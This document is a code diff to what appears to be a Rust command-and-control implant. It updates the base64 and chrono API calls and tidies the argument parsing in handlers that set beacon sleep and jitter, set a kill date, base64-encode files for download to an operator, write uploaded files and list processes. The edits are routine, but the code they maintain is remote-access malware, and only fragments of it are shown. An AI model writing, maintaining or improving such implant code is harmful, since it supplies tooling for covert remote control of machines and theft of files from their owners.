@@ -1,3 +1,4 @@
+use base64::{engine::general_purpose::STANDARD, Engine as _};
 use link_common::{
     build_client, decrypt_config, derive_key, CallbackRequest, RegisterRequest, TaskResponse,
 };
@@ -295,11 +296,11 @@ fn handle_sleep_command(args: &str) -> String {
     // Parse arguments
     let parts: Vec<&str> = args.split_whitespace().collect();
 
-    if parts.len() >= 1 {
+    if !parts.is_empty() {
         if let Ok(new_sleep) = parts[0].parse::<u64>() {
             set_sleep_seconds(new_sleep);
 
-            if parts.len() >= 2 {
+            if parts.len() > 1 {
                 if let Ok(new_jitter) = parts[1].parse::<u32>() {
                     set_jitter_percent(new_jitter);
                     return format!(
@@ -322,7 +323,7 @@ fn handle_killdate_command(args: &str) -> String {
         match get_kill_date() {
             Some(timestamp) => {
                 // Convert timestamp to readable date
-                if let Some(date_time) = chrono::NaiveDateTime::from_timestamp_opt(timestamp, 0) {
+                if let Some(date_time) = chrono::DateTime::from_timestamp(timestamp, 0) {
                     format!(
                         "Current kill date: {}",
                         date_time.format("%Y-%m-%d %H:%M:%S")
@@ -340,7 +341,7 @@ fn handle_killdate_command(args: &str) -> String {
         // Parse date in format YYYY-MM-DD or timestamp
         if let Ok(timestamp) = args.parse::<i64>() {
             set_kill_date(Some(timestamp));
-            if let Some(date_time) = chrono::NaiveDateTime::from_timestamp_opt(timestamp, 0) {
+            if let Some(date_time) = chrono::DateTime::from_timestamp(timestamp, 0) {
                 format!(
                     "[+] Kill date set to: {}",
                     date_time.format("%Y-%m-%d %H:%M:%S")
@@ -387,7 +388,7 @@ fn download_file(path: &str) -> String {
             }
 
             // Encode file content in base64
-            let encoded = base64::encode(&buffer);
+            let encoded = STANDARD.encode(&buffer);
             format!("FILE:{}:{}", path, encoded)
         }
         Err(e) => format!("[-] Failed to open file: {}", e),
@@ -412,7 +413,7 @@ fn upload_file(args: &str) -> String {
     let path = parts[1];
 
     // Decode base64 content
-    let decoded = match base64::decode(content) {
+    let decoded = match STANDARD.decode(content) {
         Ok(data) => data,
         Err(e) => return format!("[-] Failed to decode base64: {}", e),
     };
@@ -587,7 +588,6 @@ fn list_processes() -> String {
                             } else if line.starts_with("Uid:") {
                                 if let Some(uid_val) = line.split(':').nth(1) {
                                     if let Some(u) = uid_val
-                                        .trim()
                                         .split_whitespace()
                                         .next()
                                         .and_then(|s| s.parse::<u32>().ok())
